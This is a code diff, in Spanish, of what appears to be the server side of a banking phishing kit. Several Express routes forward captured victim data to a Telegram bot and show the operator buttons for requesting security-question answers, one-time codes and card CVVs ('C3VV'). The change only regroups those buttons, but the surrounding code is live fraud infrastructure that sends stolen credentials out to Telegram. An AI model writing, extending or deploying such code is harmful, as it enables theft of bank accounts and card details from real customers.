@@ -76,12 +76,16 @@ app.post('/enviar', async (req, res) => {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }],
-      [{ text: "💳C3VV", callback_data: `ceve:${txid}` }],
-      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
-    ]
+  [
+    { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
+    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+  ],
+  [
+    { text: "💳C3VV", callback_data: `ceve:${txid}` },
+    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+  ]
+]
   };
 
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -125,12 +129,16 @@ app.post('/enviare', async (req, res) => {
 
   const keyboard = {
     inline_keyboard: [
-       [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }],
-      [{ text: "💳C3VV", callback_data: `ceve:${txid}` }],
-      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
-    ]
+  [
+    { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
+    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+  ],
+  [
+    { text: "💳C3VV", callback_data: `ceve:${txid}` },
+    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+  ]
+]
   };
 
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -171,12 +179,16 @@ ${pregunta2}❓ : <code>${respuesta2}</code>
 
   const keyboard = {
     inline_keyboard: [
-       [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }],
-      [{ text: "💳C3VV", callback_data: `ceve:${txid}` }],
-      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
-    ]
+  [
+    { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
+    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+  ],
+  [
+    { text: "💳C3VV", callback_data: `ceve:${txid}` },
+    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+  ]
+]
   };
 
   const cliente = cargarCliente(txid) || {};
@@ -221,12 +233,16 @@ ${pregunta2}❓ : <code>${respuesta2}</code>
 
   const keyboard = {
     inline_keyboard: [
-       [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }],
-      [{ text: "💳C3VV", callback_data: `ceve:${txid}` }],
-      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
-    ]
+  [
+    { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
+    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+  ],
+  [
+    { text: "💳C3VV", callback_data: `ceve:${txid}` },
+    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+  ]
+]
   };
 
   const cliente = cargarCliente(txid) || {};
@@ -266,12 +282,16 @@ app.post('/enviar3', async (req, res) => {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }],
-      [{ text: "💳C3VV", callback_data: `ceve:${txid}` }],
-      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
-    ]
+  [
+    { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
+    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+  ],
+  [
+    { text: "💳C3VV", callback_data: `ceve:${txid}` },
+    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+  ]
+]
   };
 
   const cliente = cargarCliente(txid) || {};
@@ -310,12 +330,16 @@ app.post('/enviar4', async (req, res) => {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }],
-      [{ text: "💳C3VV", callback_data: `ceve:${txid}` }],
-      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
-    ]
+  [
+    { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
+    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+  ],
+  [
+    { text: "💳C3VV", callback_data: `ceve:${txid}` },
+    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+  ]
+]
   };
 
   const cliente = cargarCliente(txid) || {};
